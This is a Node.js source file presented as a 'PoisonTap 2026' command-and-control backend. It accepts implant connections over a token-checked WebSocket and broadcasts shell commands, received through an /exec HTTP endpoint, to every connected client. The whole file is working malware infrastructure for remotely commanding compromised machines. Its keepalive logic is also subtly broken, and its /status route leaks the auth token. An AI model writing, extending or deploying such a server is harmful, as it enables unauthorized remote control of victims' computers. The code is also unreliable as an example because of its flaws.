// PoisonTap 2026 | Modern C2 Backend
const http = require('http');
const https = require('https');
const WebSocket = require('ws');
const fs = require('fs');
const crypto = require('crypto');

const PORT = 1337;
const WSS_PORT = 443;
const clients = new Map();
const AUTH_TOKEN = crypto.randomBytes(16).toString('hex');

const wss = new WebSocket.Server({ port: WSS_PORT, verifyClient: (info, cb) => {
  const token = info.req.headers['x-auth'];
  cb(token === AUTH_TOKEN);
}});

wss.on('connection', (ws) => {
  const id = crypto.randomUUID();
  clients.set(id, { ws, conn: Date.now() });
  ws.isAlive = true;

  ws.on('pong', () => { ws.isAlive = true; });
  ws.on('message', (data) => {
    try {
      const msg = JSON.parse(data.toString());
      if(msg.type === 'heartbeat') return;
      console.log(`[C2] ${id}:`, msg);
    } catch(e){}
  });
  ws.on('close', () => clients.delete(id));
});

setInterval(() => {
  wss.clients.forEach(ws => {
    if(!ws.isAlive) return ws.terminate();
    ws.isAlive = true;
    ws.ping();
  });
}, 30000);

http.createServer((req, res) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  if(url.pathname === '/status'){
    res.writeHead(200, {'Content-Type':'application/json'});
    res.end(JSON.stringify({connected: clients.size, token: AUTH_TOKEN}));
  } else if(url.pathname === '/exec'){
    const cmd = decodeURIComponent(url.searchParams.get('cmd') || '');
    clients.forEach((c, id) => c.ws.send(JSON.stringify({type:'exec', id, payload:cmd})));
    res.writeHead(200, {'Content-Type':'text/plain'}); res.end('queued');
  } else {
    res.writeHead(404); res.end();
  }
}).listen(PORT);

console.log(`[+] Backend C2 active: http://0.0.0.0:${PORT} | WSS on ${WSS_PORT} (auth: ${AUTH_TOKEN})`);
